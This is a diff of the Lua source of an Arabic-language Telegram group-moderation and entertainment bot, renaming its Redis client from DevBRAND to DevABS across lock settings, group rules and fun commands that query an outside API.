-elseif DevBRAND:get(BRAND.."BRAND:Lock:Bots"..msg.chat_id_) == "kick" then
+elseif DevABS:get(BRAND.."BRAND:Lock:Bots"..msg.chat_id_) == "kick" then
 lock_bots = "بالطرد"    
 else
 lock_bots = "مفتوحه"    
 end
 --     Source BRAND     --
-if DevBRAND:get(BRAND..'BRAND:Lock:Text'..msg.chat_id_) then mute_text = 'مقفله' else mute_text = 'مفتوحه'end
-if DevBRAND:get(BRAND..'BRAND:Lock:Photo'..msg.chat_id_) then mute_photo = 'مقفله' else mute_photo = 'مفتوحه' end
-if DevBRAND:get(BRAND..'BRAND:Lock:Videos'..msg.chat_id_) then mute_video = 'مقفله' else mute_video = 'مفتوحه' end
-if DevBRAND:get(BRAND..'BRAND:Lock:Gifs'..msg.chat_id_) then mute_gifs = 'مقفله' else mute_gifs = 'مفتوحه' end
-if DevBRAND:get(BRAND..'BRAND:Lock:Music'..msg.chat_id_) then mute_music = 'مقفله' else mute_music = 'مفتوحه' end
-if DevBRAND:get(BRAND..'BRAND:Lock:Inline'..msg.chat_id_) then mute_in = 'مقفله' else mute_in = 'مفتوحه' end
-if DevBRAND:get(BRAND..'BRAND:Lock:Voice'..msg.chat_id_) then mute_voice = 'مقفله' else mute_voice = 'مفتوحه' end
-if DevBRAND:get(BRAND..'BRAND:Lock:EditMsgs'..msg.chat_id_) then mute_edit = 'مقفله' else mute_edit = 'مفتوحه' end
-if DevBRAND:get(BRAND..'BRAND:Lock:Links'..msg.chat_id_) then mute_links = 'مقفله' else mute_links = 'مفتوحه' end
-if DevBRAND:get(BRAND..'BRAND:Lock:Pin'..msg.chat_id_) then lock_pin = 'مقفله' else lock_pin = 'مفتوحه' end
-if DevBRAND:get(BRAND..'BRAND:Lock:Stickers'..msg.chat_id_) then lock_sticker = 'مقفله' else lock_sticker = 'مفتوحه' end
-if DevBRAND:get(BRAND..'BRAND:Lock:TagServr'..msg.chat_id_) then lock_tgservice = 'مقفله' else lock_tgservice = 'مفتوحه' end
-if DevBRAND:get(BRAND..'BRAND:Lock:WebLinks'..msg.chat_id_) then lock_wp = 'مقفله' else lock_wp = 'مفتوحه' end
-if DevBRAND:get(BRAND..'BRAND:Lock:Hashtak'..msg.chat_id_) then lock_htag = 'مقفله' else lock_htag = 'مفتوحه' end
-if DevBRAND:get(BRAND..'BRAND:Lock:Tags'..msg.chat_id_) then lock_tag = 'مقفله' else lock_tag = 'مفتوحه' end
-if DevBRAND:get(BRAND..'BRAND:Lock:Location'..msg.chat_id_) then lock_location = 'مقفله' else lock_location = 'مفتوحه' end
-if DevBRAND:get(BRAND..'BRAND:Lock:Contact'..msg.chat_id_) then lock_contact = 'مقفله' else lock_contact = 'مفتوحه' end
-if DevBRAND:get(BRAND..'BRAND:Lock:English'..msg.chat_id_) then lock_english = 'مقفله' else lock_english = 'مفتوحه' end
-if DevBRAND:get(BRAND..'BRAND:Lock:Arabic'..msg.chat_id_) then lock_arabic = 'مقفله' else lock_arabic = 'مفتوحه' end
-if DevBRAND:get(BRAND..'BRAND:Lock:Forwards'..msg.chat_id_) then lock_forward = 'مقفله' else lock_forward = 'مفتوحه' end
-if DevBRAND:get(BRAND..'BRAND:Lock:Document'..msg.chat_id_) then lock_file = 'مقفله' else lock_file = 'مفتوحه' end
-if DevBRAND:get(BRAND..'BRAND:Lock:Markdown'..msg.chat_id_) then markdown = 'مقفله' else markdown = 'مفتوحه' end
-if DevBRAND:get(BRAND..'BRAND:Lock:Spam'..msg.chat_id_) then lock_spam = 'مقفله' else lock_spam = 'مفتوحه' end
-if DevBRAND:get(BRAND..'BRAND:Lock:Join'..msg.chat_id_) then lock_Join = 'مقفل' else lock_Join = 'مفتوح' end
-if DevBRAND:get(BRAND.."BRAND:Lock:Welcome"..msg.chat_id_) then send_welcome = 'مقفله' else send_welcome = 'مفتوحه' end
-if DevBRAND:get(BRAND..'BRAND:Lock:Fshar'..msg.chat_id_) then lock_fshar = 'مفتوح' else lock_fshar = 'مقفل' end
-if DevBRAND:get(BRAND..'BRAND:Lock:Kfr'..msg.chat_id_) then lock_kaf = 'مفتوح' else lock_kaf = 'مقفل' end
-if DevBRAND:get(BRAND..'BRAND:Lock:Taf'..msg.chat_id_) then lock_taf = 'مفتوحه' else lock_taf = 'مقفله' end
-if DevBRAND:get(BRAND..'BRAND:Lock:Farsi'..msg.chat_id_) then lock_farsi = 'مقفله' else lock_farsi = 'مفتوحه' end
-local Flood_Num = DevBRAND:hget(BRAND.."BRAND:Spam:Group:User"..msg.chat_id_,"Num:Spam") or 5
+if DevABS:get(BRAND..'BRAND:Lock:Text'..msg.chat_id_) then mute_text = 'مقفله' else mute_text = 'مفتوحه'end
+if DevABS:get(BRAND..'BRAND:Lock:Photo'..msg.chat_id_) then mute_photo = 'مقفله' else mute_photo = 'مفتوحه' end
+if DevABS:get(BRAND..'BRAND:Lock:Videos'..msg.chat_id_) then mute_video = 'مقفله' else mute_video = 'مفتوحه' end
+if DevABS:get(BRAND..'BRAND:Lock:Gifs'..msg.chat_id_) then mute_gifs = 'مقفله' else mute_gifs = 'مفتوحه' end
+if DevABS:get(BRAND..'BRAND:Lock:Music'..msg.chat_id_) then mute_music = 'مقفله' else mute_music = 'مفتوحه' end
+if DevABS:get(BRAND..'BRAND:Lock:Inline'..msg.chat_id_) then mute_in = 'مقفله' else mute_in = 'مفتوحه' end
+if DevABS:get(BRAND..'BRAND:Lock:Voice'..msg.chat_id_) then mute_voice = 'مقفله' else mute_voice = 'مفتوحه' end
+if DevABS:get(BRAND..'BRAND:Lock:EditMsgs'..msg.chat_id_) then mute_edit = 'مقفله' else mute_edit = 'مفتوحه' end
+if DevABS:get(BRAND..'BRAND:Lock:Links'..msg.chat_id_) then mute_links = 'مقفله' else mute_links = 'مفتوحه' end
+if DevABS:get(BRAND..'BRAND:Lock:Pin'..msg.chat_id_) then lock_pin = 'مقفله' else lock_pin = 'مفتوحه' end
+if DevABS:get(BRAND..'BRAND:Lock:Stickers'..msg.chat_id_) then lock_sticker = 'مقفله' else lock_sticker = 'مفتوحه' end
+if DevABS:get(BRAND..'BRAND:Lock:TagServr'..msg.chat_id_) then lock_tgservice = 'مقفله' else lock_tgservice = 'مفتوحه' end
+if DevABS:get(BRAND..'BRAND:Lock:WebLinks'..msg.chat_id_) then lock_wp = 'مقفله' else lock_wp = 'مفتوحه' end
+if DevABS:get(BRAND..'BRAND:Lock:Hashtak'..msg.chat_id_) then lock_htag = 'مقفله' else lock_htag = 'مفتوحه' end
+if DevABS:get(BRAND..'BRAND:Lock:Tags'..msg.chat_id_) then lock_tag = 'مقفله' else lock_tag = 'مفتوحه' end
+if DevABS:get(BRAND..'BRAND:Lock:Location'..msg.chat_id_) then lock_location = 'مقفله' else lock_location = 'مفتوحه' end
+if DevABS:get(BRAND..'BRAND:Lock:Contact'..msg.chat_id_) then lock_contact = 'مقفله' else lock_contact = 'مفتوحه' end
+if DevABS:get(BRAND..'BRAND:Lock:English'..msg.chat_id_) then lock_english = 'مقفله' else lock_english = 'مفتوحه' end
+if DevABS:get(BRAND..'BRAND:Lock:Arabic'..msg.chat_id_) then lock_arabic = 'مقفله' else lock_arabic = 'مفتوحه' end
+if DevABS:get(BRAND..'BRAND:Lock:Forwards'..msg.chat_id_) then lock_forward = 'مقفله' else lock_forward = 'مفتوحه' end
+if DevABS:get(BRAND..'BRAND:Lock:Document'..msg.chat_id_) then lock_file = 'مقفله' else lock_file = 'مفتوحه' end
+if DevABS:get(BRAND..'BRAND:Lock:Markdown'..msg.chat_id_) then markdown = 'مقفله' else markdown = 'مفتوحه' end
+if DevABS:get(BRAND..'BRAND:Lock:Spam'..msg.chat_id_) then lock_spam = 'مقفله' else lock_spam = 'مفتوحه' end
+if DevABS:get(BRAND..'BRAND:Lock:Join'..msg.chat_id_) then lock_Join = 'مقفل' else lock_Join = 'مفتوح' end
+if DevABS:get(BRAND.."BRAND:Lock:Welcome"..msg.chat_id_) then send_welcome = 'مقفله' else send_welcome = 'مفتوحه' end
+if DevABS:get(BRAND..'BRAND:Lock:Fshar'..msg.chat_id_) then lock_fshar = 'مفتوح' else lock_fshar = 'مقفل' end
+if DevABS:get(BRAND..'BRAND:Lock:Kfr'..msg.chat_id_) then lock_kaf = 'مفتوح' else lock_kaf = 'مقفل' end
+if DevABS:get(BRAND..'BRAND:Lock:Taf'..msg.chat_id_) then lock_taf = 'مفتوحه' else lock_taf = 'مقفله' end
+if DevABS:get(BRAND..'BRAND:Lock:Farsi'..msg.chat_id_) then lock_farsi = 'مقفله' else lock_farsi = 'مفتوحه' end
+local Flood_Num = DevABS:hget(BRAND.."BRAND:Spam:Group:User"..msg.chat_id_,"Num:Spam") or 5
 --     Source BRAND     --
 local TXTE = "⌁︙اعدادات المجموعه ↫ ⤈\n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n"
 .."⌁︙الروابط ↫ "..mute_links.."\n"
@@ -8541,24 +8541,24 @@ Dev_BRAND(msg.chat_id_,0, 1, txt[2], 1, 'md')
 DeleteMessage(msg.chat_id_,{[0] = msg.id_})
 end
 --     Source BRAND     --
-if DevBRAND:get(BRAND..'BRAND:setrules'..msg.chat_id_..':'..msg.sender_user_id_) then 
+if DevABS:get(BRAND..'BRAND:setrules'..msg.chat_id_..':'..msg.sender_user_id_) then 
 if text == 'الغاء' then 
 Dev_BRAND(msg.chat_id_, msg.id_, 1, '⌁︙تم الغاء حفظ قوانين المجموعه', 1, 'md')
-DevBRAND:del(BRAND..'BRAND:setrules'..msg.chat_id_..':'..msg.sender_user_id_)
+DevABS:del(BRAND..'BRAND:setrules'..msg.chat_id_..':'..msg.sender_user_id_)
 return false  
 end 
-DevBRAND:del(BRAND..'BRAND:setrules'..msg.chat_id_..':'..msg.sender_user_id_)
-DevBRAND:set(BRAND..'BRAND:rules'..msg.chat_id_,text)
+DevABS:del(BRAND..'BRAND:setrules'..msg.chat_id_..':'..msg.sender_user_id_)
+DevABS:set(BRAND..'BRAND:rules'..msg.chat_id_,text)
 Dev_BRAND(msg.chat_id_, msg.id_, 1, '⌁︙تم حفظ قوانين المجموعه', 1, 'md')
 return false   
 end
 if text and text:match("^ضع قوانين$") and ChCheck(msg) or text and text:match("^وضع قوانين$") and ChCheck(msg) then
 Dev_BRAND(msg.chat_id_, msg.id_, 1, '⌁︙ارسل لي القوانين الان', 1, 'md')
-DevBRAND:set(BRAND..'BRAND:setrules'..msg.chat_id_..':'..msg.sender_user_id_,true)
+DevABS:set(BRAND..'BRAND:setrules'..msg.chat_id_..':'..msg.sender_user_id_,true)
 end
 end
 if text and text:match("^القوانين$") then
-local rules = DevBRAND:get(BRAND..'BRAND:rules'..msg.chat_id_)
+local rules = DevABS:get(BRAND..'BRAND:rules'..msg.chat_id_)
 Dev_BRAND(msg.chat_id_, msg.id_, 1, rules, 1, nil)
 end
 --     Source BRAND     --
@@ -8576,14 +8576,14 @@ end
 if text == "تفعيل انطق" and Manager(msg) and ChCheck(msg) then
 local BRANDTTEAM = '⌁︙اهلا عزيزي ↫ '..BRANDRank(msg)..' \n⌁︙تم تفعيل ميزة انطق'
 BRANDmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, BRANDTTEAM, 14, string.len(msg.sender_user_id_))
-DevBRAND:del(BRAND..'BRAND:Antk:BRAND'..msg.chat_id_) 
+DevABS:del(BRAND..'BRAND:Antk:BRAND'..msg.chat_id_) 
 end
 if text == "تعطيل انطق" and Manager(msg) and ChCheck(msg) then
 local BRANDTTEAM = '⌁︙اهلا عزيزي ↫ '..BRANDRank(msg)..' \n⌁︙تم تعطيل ميزة انطق'
 BRANDmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, BRANDTTEAM, 14, string.len(msg.sender_user_id_))
-DevBRAND:set(BRAND..'BRAND:Antk:BRAND'..msg.chat_id_,true)  
+DevABS:set(BRAND..'BRAND:Antk:BRAND'..msg.chat_id_,true)  
 end
-if text and text:match("^انطق (.*)$") and not DevBRAND:get(BRAND..'BRAND:Antk:BRAND'..msg.chat_id_) and SourceCh(msg) then
+if text and text:match("^انطق (.*)$") and not DevABS:get(BRAND..'BRAND:Antk:BRAND'..msg.chat_id_) and SourceCh(msg) then
 local UrlAntk = https.request('https://apiDevprox.ml/Antk.php?BRAND='..URL.escape(text:match("^انطق (.*)$")))
 Antk = JSON.decode(UrlAntk)
 if UrlAntk.ok ~= false then
@@ -8596,17 +8596,17 @@ end
 if text == "تفعيل الزخرفه" and Manager(msg) and ChCheck(msg) then
 local BRANDTTEAM = '⌁︙اهلا عزيزي ↫ '..BRANDRank(msg)..' \n⌁︙تم تفعيل الزخرفه بنجاح'
 BRANDmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, BRANDTTEAM, 14, string.len(msg.sender_user_id_))
-DevBRAND:del(BRAND..'BRAND:Zrf:BRAND'..msg.chat_id_) 
+DevABS:del(BRAND..'BRAND:Zrf:BRAND'..msg.chat_id_) 
 end
 if text == "تعطيل الزخرفه" and Manager(msg) and ChCheck(msg) then
 local BRANDTTEAM = '⌁︙اهلا عزيزي ↫ '..BRANDRank(msg)..' \n⌁︙تم تعطيل الزخرفه بنجاح'
 BRANDmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, BRANDTTEAM, 14, string.len(msg.sender_user_id_))
-DevBRAND:set(BRAND..'BRAND:Zrf:BRAND'..msg.chat_id_,true)  
+DevABS:set(BRAND..'BRAND:Zrf:BRAND'..msg.chat_id_,true)  
 end
-if DevBRAND:get(BRAND..'Zrf:BRAND'..msg.chat_id_..msg.sender_user_id_) then 
+if DevABS:get(BRAND..'Zrf:BRAND'..msg.chat_id_..msg.sender_user_id_) then 
 if text and text == 'الغاء' then 
 Dev_BRAND(msg.chat_id_, msg.id_, 1, '⌁︙تم الغاء امر الزخرفه', 1, 'md')
-DevBRAND:del(BRAND..'Zrf:BRAND'..msg.chat_id_..msg.sender_user_id_)
+DevABS:del(BRAND..'Zrf:BRAND'..msg.chat_id_..msg.sender_user_id_)
 return false  
 end 
 UrlZrf = https.request('https://apiDevprox.ml/zrf.php?BRAND='..URL.escape(text)) 
@@ -8618,16 +8618,16 @@ i = i + 1
 t = t..i.."~ `"..v.."` \n"
 end
 Dev_BRAND(msg.chat_id_, msg.id_, 1, t, 1, 'md')
-DevBRAND:del(BRAND..'Zrf:BRAND'..msg.chat_id_..msg.sender_user_id_)
+DevABS:del(BRAND..'Zrf:BRAND'..msg.chat_id_..msg.sender_user_id_)
 return false   
 end
-if not DevBRAND:get(BRAND..'BRAND:Zrf:BRAND'..msg.chat_id_) then
+if not DevABS:get(BRAND..'BRAND:Zrf:BRAND'..msg.chat_id_) then
 if text == 'زخرفه' and ChCheck(msg) or text == 'الزخرفه' and ChCheck(msg) then  
-DevBRAND:setex(BRAND.."Zrf:BRAND"..msg.chat_id_..msg.sender_user_id_,300,true)
+DevABS:setex(BRAND.."Zrf:BRAND"..msg.chat_id_..msg.sender_user_id_,300,true)
 Dev_BRAND(msg.chat_id_, msg.id_, 1, '⌁︙ارسل لي الكلمه لزخرفتها \nيمكنك الزخرفة باللغه { en } ~ { ar } ', 1, 'md')
 end
 end
-if not DevBRAND:get(BRAND..'BRAND:Zrf:BRAND'..msg.chat_id_) then
+if not DevABS:get(BRAND..'BRAND:Zrf:BRAND'..msg.chat_id_) then
 if text and text:match("^زخرفه (.*)$") and SourceCh(msg) or text and text:match("^زخرف (.*)$") and SourceCh(msg) then 
 local TextZrf = text:match("^زخرفه (.*)$") or text:match("^زخرف (.*)$") 
 UrlZrf = https.request('https://apiDevprox.ml/zrf.php?BRAND='..URL.escape(TextZrf)) 
@@ -8645,14 +8645,14 @@ end
 if text == "تفعيل الابراج" and Manager(msg) and ChCheck(msg) then
 local BRANDTTEAM = '⌁︙اهلا عزيزي ↫ '..BRANDRank(msg)..' \n⌁︙تم تفعيل الابراج بنجاح'
 BRANDmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, BRANDTTEAM, 14, string.len(msg.sender_user_id_))
-DevBRAND:del(BRAND..'BRAND:Brg:BRAND'..msg.chat_id_) 
+DevABS:del(BRAND..'BRAND:Brg:BRAND'..msg.chat_id_) 
 end
 if text == "تعطيل الابراج" and Manager(msg) and ChCheck(msg) then
 local BRANDTTEAM = '⌁︙اهلا عزيزي ↫ '..BRANDRank(msg)..' \n⌁︙تم تعطيل الابراج بنجاح'
 BRANDmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, BRANDTTEAM, 14, string.len(msg.sender_user_id_))
-DevBRAND:set(BRAND..'BRAND:Brg:BRAND'..msg.chat_id_,true)  
+DevABS:set(BRAND..'BRAND:Brg:BRAND'..msg.chat_id_,true)  
 end
-if not DevBRAND:get(BRAND..'BRAND:Brg:BRAND'..msg.chat_id_) then
+if not DevABS:get(BRAND..'BRAND:Brg:BRAND'..msg.chat_id_) then
 if text and text:match("^برج (.*)$") and SourceCh(msg) or text and text:match("^برجي (.*)$") and SourceCh(msg) then 
 local TextBrg = text:match("^برج (.*)$") or text:match("^برجي (.*)$") 
 UrlBrg = https.request('https://apiDevprox.ml/brg.?brg='..URL.escape(TextBrg)) 
@@ -8665,110 +8665,110 @@ end
 if text and (text == "تفعيل اوامر النسب" or text == "تفعيل نسبه الحب" or text == "تفعيل نسبه الكره" or text == "تفعيل نسبه الرجوله" or text == "تفعيل نسبه الانوثه" or text == "تفعيل نسبه الغباء") and Manager(msg) and ChCheck(msg) then
 local BRANDTTEAM = '⌁︙اهلا عزيزي ↫ '..BRANDRank(msg)..' \n⌁︙تم تفعيل اوامر النسب'
 BRANDmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, BRANDTTEAM, 14, string.len(msg.sender_user_id_))
-DevBRAND:del(BRAND..'BRAND:Nsba:BRAND'..msg.chat_id_) 
+DevABS:del(BRAND..'BRAND:Nsba:BRAND'..msg.chat_id_) 
 end
 if text and (text == "تعطيل اوامر النسب" or text == "تعطيل نسبه الحب" or text == "تعطيل نسبه الكره" or text == "تعطيل نسبه الرجوله" or text == "تعطيل نسبه الانوثه" or text == "تعطيل نسبه الغباء") and Manager(msg) and ChCheck(msg) then
 local BRANDTTEAM = '⌁︙اهلا عزيزي ↫ '..BRANDRank(msg)..' \n⌁︙تم تعطيل اوامر النسب'
 BRANDmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, BRANDTTEAM, 14, string.len(msg.sender_user_id_))
-DevBRAND:set(BRAND..'BRAND:Nsba:BRAND'..msg.chat_id_,true)  
+DevABS:set(BRAND..'BRAND:Nsba:BRAND'..msg.chat_id_,true)  
 end
-if not DevBRAND:get(BRAND..'BRAND:Nsba:BRAND'..msg.chat_id_) then
+if not DevABS:get(BRAND..'BRAND:Nsba:BRAND'..msg.chat_id_) then
 if text == "نسبه الحب" and SourceCh(msg) or text == "نسبة الحب" and SourceCh(msg) then
-DevBRAND:set(BRAND..'LoveNsba:BRAND'..msg.chat_id_..msg.sender_user_id_,true) 
+DevABS:set(BRAND..'LoveNsba:BRAND'..msg.chat_id_..msg.sender_user_id_,true) 
 Dev_BRAND(msg.chat_id_, msg.id_, 1, '⌁︙قم بارسل اسمين لحساب نسبة الحب بينهما كمثال ↫ جاك وروز', 1, 'md')
 end
 end
-if text and text ~= "نسبه الحب" and text ~= "نسبة الحب" and DevBRAND:get(BRAND..'LoveNsba:BRAND'..msg.chat_id_..msg.sender_user_id_) then
+if text and text ~= "نسبه الحب" and text ~= "نسبة الحب" and DevABS:get(BRAND..'LoveNsba:BRAND'..msg.chat_id_..msg.sender_user_id_) then
 if text and text == 'الغاء' then 
 Dev_BRAND(msg.chat_id_, msg.id_, 1, '⌁︙تم الغاء امر نسبة الحب ', 1, 'md')
-DevBRAND:del(BRAND..'LoveNsba:BRAND'..msg.chat_id_..msg.sender_user_id_) 
+DevABS:del(BRAND..'LoveNsba:BRAND'..msg.chat_id_..msg.sender_user_id_) 
 return false 
 end 
 BRAND = math.random(0,100);
 Dev_BRAND(msg.chat_id_, msg.id_, 1, '⌁︙نسبة الحب بين '..text..' هي : '..BRAND..'%', 1, 'md')
-DevBRAND:del(BRAND..'LoveNsba:BRAND'..msg.chat_id_..msg.sender_user_id_) 
+DevABS:del(BRAND..'LoveNsba:BRAND'..msg.chat_id_..msg.sender_user_id_) 
 return false 
 end
-if not DevBRAND:get(BRAND..'BRAND:Nsba:BRAND'..msg.chat_id_) then
+if not DevABS:get(BRAND..'BRAND:Nsba:BRAND'..msg.chat_id_) then
 if text == "نسبه الكره" and SourceCh(msg) or text == "نسبة الكره" and SourceCh(msg) then
-DevBRAND:set(BRAND..'HataNsba:BRAND'..msg.chat_id_..msg.sender_user_id_,true) 
+DevABS:set(BRAND..'HataNsba:BRAND'..msg.chat_id_..msg.sender_user_id_,true) 
 Dev_BRAND(msg.chat_id_, msg.id_, 1, '⌁︙قم بارسل اسمين لحساب نسبة الكره بينهما كمثال ↫ جاك وروز', 1, 'md')
 end
 end
-if text and text ~= "نسبه الكره" and text ~= "نسبة الكره" and DevBRAND:get(BRAND..'HataNsba:BRAND'..msg.chat_id_..msg.sender_user_id_) then
+if text and text ~= "نسبه الكره" and text ~= "نسبة الكره" and DevABS:get(BRAND..'HataNsba:BRAND'..msg.chat_id_..msg.sender_user_id_) then
 if text and text == 'الغاء' then 
 Dev_BRAND(msg.chat_id_, msg.id_, 1, '⌁︙تم الغاء امر نسبة الكره ', 1, 'md')
-DevBRAND:del(BRAND..'HataNsba:BRAND'..msg.chat_id_..msg.sender_user_id_) 
+DevABS:del(BRAND..'HataNsba:BRAND'..msg.chat_id_..msg.sender_user_id_) 
 return false 
 end 
 BRAND = math.random(0,100);
 Dev_BRAND(msg.chat_id_, msg.id_, 1, '⌁︙نسبة الكره بين '..text..' هي : '..BRAND..'%', 1, 'md')
-DevBRAND:del(BRAND..'HataNsba:BRAND'..msg.chat_id_..msg.sender_user_id_) 
+DevABS:del(BRAND..'HataNsba:BRAND'..msg.chat_id_..msg.sender_user_id_) 
 return false 
 end
-if not DevBRAND:get(BRAND..'BRAND:Nsba:BRAND'..msg.chat_id_) then
+if not DevABS:get(BRAND..'BRAND:Nsba:BRAND'..msg.chat_id_) then
 if text and (text == "نسبه الرجوله" or text == "نسبة الرجوله" or text == "نسبه رجوله" or text == "نسبة رجوله") and SourceCh(msg) then
-DevBRAND:set(BRAND..'RjolaNsba:BRAND'..msg.chat_id_..msg.sender_user_id_,true) 
+DevABS:set(BRAND..'RjolaNsba:BRAND'..msg.chat_id_..msg.sender_user_id_,true) 
 Dev_BRAND(msg.chat_id_, msg.id_, 1, '⌁︙قم بارسل اسم الشخص لقياس نسبة رجولته كمثال ↫ جاك', 1, 'md')
 end
 end
-if text and text ~= "نسبه الرجوله" and text ~= "نسبة الرجوله" and text ~= "نسبه رجوله" and text ~= "نسبة رجوله" and DevBRAND:get(BRAND..'RjolaNsba:BRAND'..msg.chat_id_..msg.sender_user_id_) then
+if text and text ~= "نسبه الرجوله" and text ~= "نسبة الرجوله" and text ~= "نسبه رجوله" and text ~= "نسبة رجوله" and DevABS:get(BRAND..'RjolaNsba:BRAND'..msg.chat_id_..msg.sender_user_id_) then
 if text and text == 'الغاء' then 
 Dev_BRAND(msg.chat_id_, msg.id_, 1, '⌁︙تم الغاء امر نسبة الرجوله ', 1, 'md')
-DevBRAND:del(BRAND..'RjolaNsba:BRAND'..msg.chat_id_..msg.sender_user_id_) 
+DevABS:del(BRAND..'RjolaNsba:BRAND'..msg.chat_id_..msg.sender_user_id_) 
 return false 
 end 
 BRAND = math.random(0,100);
 Dev_BRAND(msg.chat_id_, msg.id_, 1, '⌁︙نسبة رجولة '..text..' هي : '..BRAND..'%', 1, 'md')
-DevBRAND:del(BRAND..'RjolaNsba:BRAND'..msg.chat_id_..msg.sender_user_id_) 
+DevABS:del(BRAND..'RjolaNsba:BRAND'..msg.chat_id_..msg.sender_user_id_) 
 return false 
 end
-if not DevBRAND:get(BRAND..'BRAND:Nsba:BRAND'..msg.chat_id_) then
+if not DevABS:get(BRAND..'BRAND:Nsba:BRAND'..msg.chat_id_) then
 if text and (text == "نسبه الانوثه" or text == "نسبة الانوثه" or text == "نسبه انوثه" or text == "نسبة انوثه") and SourceCh(msg) then
-DevBRAND:set(BRAND..'AnothaNsba:BRAND'..msg.chat_id_..msg.sender_user_id_,true) 
+DevABS:set(BRAND..'AnothaNsba:BRAND'..msg.chat_id_..msg.sender_user_id_,true) 
 Dev_BRAND(msg.chat_id_, msg.id_, 1, '⌁︙قم بارسل اسم الشخص لقياس نسبة انوثته كمثال ↫ روز', 1, 'md')
 end
 end
-if text and text ~= "نسبه الانوثه" and text ~= "نسبة الانوثه" and text ~= "نسبه انوثه" and text ~= "نسبة انوثه" and DevBRAND:get(BRAND..'AnothaNsba:BRAND'..msg.chat_id_..msg.sender_user_id_) then
+if text and text ~= "نسبه الانوثه" and text ~= "نسبة الانوثه" and text ~= "نسبه انوثه" and text ~= "نسبة انوثه" and DevABS:get(BRAND..'AnothaNsba:BRAND'..msg.chat_id_..msg.sender_user_id_) then
 if text and text == 'الغاء' then 
 Dev_BRAND(msg.chat_id_, msg.id_, 1, '⌁︙تم الغاء امر نسبة الانوثه ', 1, 'md')
-DevBRAND:del(BRAND..'AnothaNsba:BRAND'..msg.chat_id_..msg.sender_user_id_) 
+DevABS:del(BRAND..'AnothaNsba:BRAND'..msg.chat_id_..msg.sender_user_id_) 
 return false 
 end 
 BRAND = math.random(0,100);
 Dev_BRAND(msg.chat_id_, msg.id_, 1, '⌁︙نسبة انوثة '..text..' هي : '..BRAND..'%', 1, 'md')
-DevBRAND:del(BRAND..'AnothaNsba:BRAND'..msg.chat_id_..msg.sender_user_id_) 
+DevABS:del(BRAND..'AnothaNsba:BRAND'..msg.chat_id_..msg.sender_user_id_) 
 return false 
 end
-if not DevBRAND:get(BRAND..'BRAND:Nsba:BRAND'..msg.chat_id_) then
+if not DevABS:get(BRAND..'BRAND:Nsba:BRAND'..msg.chat_id_) then
 if text and (text == "نسبه الغباء" or text == "نسبة الغباء") and SourceCh(msg) then
-DevBRAND:set(BRAND..'StupidNsba:BRAND'..msg.chat_id_..msg.sender_user_id_,true) 
+DevABS:set(BRAND..'StupidNsba:BRAND'..msg.chat_id_..msg.sender_user_id_,true) 
 Dev_BRAND(msg.chat_id_, msg.id_, 1, '⌁︙قم بارسل اسم الشخص لقياس نسبة غبائه كمثال ↫ جاك او روز', 1, 'md')
 end
 end
-if text and text ~= "نسبه الغباء" and text ~= "نسبة الغباء" and DevBRAND:get(BRAND..'StupidNsba:BRAND'..msg.chat_id_..msg.sender_user_id_) then
+if text and text ~= "نسبه الغباء" and text ~= "نسبة الغباء" and DevABS:get(BRAND..'StupidNsba:BRAND'..msg.chat_id_..msg.sender_user_id_) then
 if text and text == 'الغاء' then 
 Dev_BRAND(msg.chat_id_, msg.id_, 1, '⌁︙تم الغاء امر نسبة الغباء ', 1, 'md')
-DevBRAND:del(BRAND..'StupidNsba:BRAND'..msg.chat_id_..msg.sender_user_id_) 
+DevABS:del(BRAND..'StupidNsba:BRAND'..msg.chat_id_..msg.sender_user_id_) 
 return false 
 end 
 BRAND = math.random(0,100);
 Dev_BRAND(msg.chat_id_, msg.id_, 1, '⌁︙نسبة غباء '..text..' هي : '..BRAND..'%', 1, 'md')
-DevBRAND:del(BRAND..'StupidNsba:BRAND'..msg.chat_id_..msg.sender_user_id_) 
+DevABS:del(BRAND..'StupidNsba:BRAND'..msg.chat_id_..msg.sender_user_id_) 
 return false 
 end
 --     Source BRAND     --
 if text == "تفعيل حساب العمر" and Manager(msg) and ChCheck(msg) then
 local BRANDTTEAM = '⌁︙اهلا عزيزي ↫ '..BRANDRank(msg)..' \n⌁︙تم تفعيل حساب العمر'
 BRANDmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, BRANDTTEAM, 14, string.len(msg.sender_user_id_))
-DevBRAND:del(BRAND..'BRAND:Age:BRAND'..msg.chat_id_) 
+DevABS:del(BRAND..'BRAND:Age:BRAND'..msg.chat_id_) 
 end
 if text == "تعطيل حساب العمر" and Manager(msg) and ChCheck(msg) then
 local BRANDTTEAM = '⌁︙اهلا عزيزي ↫ '..BRANDRank(msg)..' \n⌁︙تم تعطيل حساب العمر'
 BRANDmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, BRANDTTEAM, 14, string.len(msg.sender_user_id_))
-DevBRAND:set(BRAND..'BRAND:Age:BRAND'..msg.chat_id_,true)  
+DevABS:set(BRAND..'BRAND:Age:BRAND'..msg.chat_id_,true)  
 end
-if not DevBRAND:get(BRAND..'BRAND:Age:BRAND'..msg.chat_id_) then
+if not DevABS:get(BRAND..'BRAND:Age:BRAND'..msg.chat_id_) then
 if text and text:match("^احسب (.*)$") and SourceCh(msg) or text and text:match("^عمري (.*)$") and SourceCh(msg) then 
 local TextAge = text:match("^احسب (.*)$") or text:match("^عمري (.*)$") 
 UrlAge = https.request('https://apiDevprox.ml/age.php?age='..URL.escape(TextAge)) 
@@ -8781,14 +8781,14 @@ end
 if text == "تفعيل معاني الاسماء" and Manager(msg) and ChCheck(msg) then
 local BRANDTTEAM = '⌁︙اهلا عزيزي ↫ '..BRANDRank(msg)..' \n⌁︙تم تفعيل معاني الاسماء'
 BRANDmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, BRANDTTEAM, 14, string.len(msg.sender_user_id_))
-DevBRAND:del(BRAND..'BRAND:Mean:BRAND'..msg.chat_id_) 
+DevABS:del(BRAND..'BRAND:Mean:BRAND'..msg.chat_id_) 
 end
 if text == "تعطيل معاني الاسماء" and Manager(msg) and ChCheck(msg) then
